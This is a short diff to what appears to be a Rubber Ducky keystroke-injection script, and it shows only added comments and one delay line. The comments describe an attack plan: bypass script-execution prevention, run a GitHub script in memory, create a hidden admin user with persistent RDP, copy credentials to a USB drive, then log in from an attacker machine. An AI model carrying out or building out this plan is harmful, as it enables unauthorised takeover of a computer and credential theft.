@@ -1,5 +1,12 @@
+
 # REM this ducky script bypass script Prevention from running ,after that is loads to  the RAM the github script and in 
 # the end   run the script in the RAM.
+# REM ir creates constent remote rdp , create a user with admin rights and send the data of the pc with user creds  to a usb 
+# REM mass storage device that is connected
+
+# REM stage 1 - insert diffrent usb mass storage device.
+# REM stage 2 - run the ducky script with the rubeer ducky and get the cred's in the sepreted usb that was inserted
+# REM stage 3 - connect from an attacker machine with an rdp program with the right pc cred's
 
 
 DELAY 500
